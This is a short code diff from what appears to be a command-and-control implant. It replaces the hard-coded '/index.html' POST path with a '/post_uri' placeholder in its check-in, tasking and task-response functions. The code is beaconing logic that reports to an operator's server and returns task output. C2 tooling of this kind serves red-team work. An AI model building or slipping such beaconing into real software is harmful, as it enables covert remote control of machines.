@@ -51,7 +51,7 @@ function checkIn(context) {
 	}
 	const encoded_checkin = composeRequest(payloadUUID, checkinData)
 
-	client.post('/index.html', encoded_checkin)
+	client.post('/post_uri', encoded_checkin)
 		.then(function (response) {
 			const checkinResponse = parseResponse(response)
 
@@ -72,7 +72,7 @@ function getTasking(context) {
 	}
 	const encoded_request = composeRequest(callbackUUID, taskingData);
 
-	client.post('/index.html', encoded_request)
+	client.post('/post_uri', encoded_request)
 		.then(function (response) {
 			const taskingResponse = parseResponse(response)
 
@@ -107,7 +107,7 @@ function postTaskResponse(uuid, taskID, output) {
 	}
 	const encoded_request = composeRequest(uuid, taskingData);
 
-	client.post('/index.html', encoded_request)
+	client.post('/post_uri', encoded_request)
 		.then(function (response) {
 			const taskingResponse = parseResponse(response)
 		})
